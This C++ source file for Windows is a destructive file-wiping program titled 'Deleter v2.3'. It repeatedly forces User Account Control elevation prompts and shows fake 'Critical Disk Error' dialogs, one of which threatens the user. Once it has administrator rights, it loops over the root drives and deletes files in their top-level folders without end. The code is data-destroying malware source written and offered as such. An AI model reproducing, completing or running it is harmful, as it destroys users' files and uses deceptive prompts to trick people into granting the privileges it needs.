#include <filesystem>
#include <iostream>
#include <string>
#include <vector>
#include <windows.h>
using namespace std;
using namespace std::filesystem;

BOOL IsRunAsAdministrator() {
  BOOL fIsRunAsAdmin = FALSE;
  DWORD dwError = ERROR_SUCCESS;
  PSID pAdministratorsGroup = NULL;

  SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
  if (!AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0,
                                &pAdministratorsGroup)) {
    dwError = GetLastError();
    goto Cleanup;
  }

  if (!CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin)) {
    dwError = GetLastError();
    goto Cleanup;
  }

Cleanup:

  if (pAdministratorsGroup) {
    FreeSid(pAdministratorsGroup);
    pAdministratorsGroup = NULL;
  }

  if (ERROR_SUCCESS != dwError) {
    throw dwError;
  }

  return fIsRunAsAdmin;
}
BOOL IsRunAsAdministrator();
void ElevateNow() {
  BOOL bAlreadyRunningAsAdministrator = FALSE;
  try {
    bAlreadyRunningAsAdministrator = IsRunAsAdministrator();
  } catch (...) {
    _asm nop
  }
  if (!bAlreadyRunningAsAdministrator) {
    char szPath[MAX_PATH];
    if (GetModuleFileName(NULL, szPath, ARRAYSIZE(szPath))) {

      SHELLEXECUTEINFO sei = {sizeof(sei)};

      sei.lpVerb = "runas";
      sei.lpFile = szPath;
      sei.hwnd = NULL;
      sei.nShow = SW_NORMAL;

      if (!ShellExecuteEx(&sei)) {
        DWORD dwError = GetLastError();
        if (dwError == ERROR_CANCELLED)
          // Annoys you to Elevate it LOL
          CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ElevateNow, 0, 0, 0);
      }
    }

  } else {
	DeleterMain();
  }
}
int DeleterMain() {
  ElevateNow();
  if (IsRunAsAdministrator()) {
    string Title = "Deleter v2.3";
    cout << Title << endl;
    vector<path> Disks; // Declare an empty vector
    while (true) {
      for (const directory_entry &root : recursive_directory_iterator(
               std::filesystem::current_path()
                   .root_directory())) {
        if (root.path().parent_path() != root.path() &&
            root.path().string().length() <= 3) {
          cout << "Possible Root Directory: " << root.path() << endl;
          Disks.push_back(root.path());
        }
        std::vector<std::string> drives;
        for (const path &disk : Disks) {
          drives.push_back(disk.string());
        }
        // Iterate through the split drives
        for (const std::string &drive : drives) {
          std::vector<path> dirs;
          for (const directory_entry &entry :
               std::filesystem::directory_iterator(drive)) {
            dirs.push_back(entry.path());
          }
          for (const path &dir : dirs) {
            if (is_directory(dir)) {
              std::vector<path> files;
              for (const directory_entry &file :
                   std::filesystem::directory_iterator(dir)) {
                files.push_back(file.path());
              }
              for (const path &file : files) {
                cout << "Deleting " << file << endl;
                try {
                  std::error_code ec;
                  remove(file, ec);
                } catch (exception e) {
                  std::cerr << "Error deleting file: " << e.what() << std::endl;
                }
              }
            }
          }
        }
      }
    }
  } else {
    if (MessageBox(0, "Need To Elevate", "Critical Disk Error",
                   MB_SYSTEMMODAL | MB_ICONERROR | MB_YESNO) == IDYES) {
      ElevateNow();
    } else {
      MessageBox(0, "You Better give me Elevation or I will attack u",
                 "System Critical Error",
                 MB_SYSTEMMODAL | MB_OK | MB_ICONERROR);
      ElevateNow();
    }
  }
}
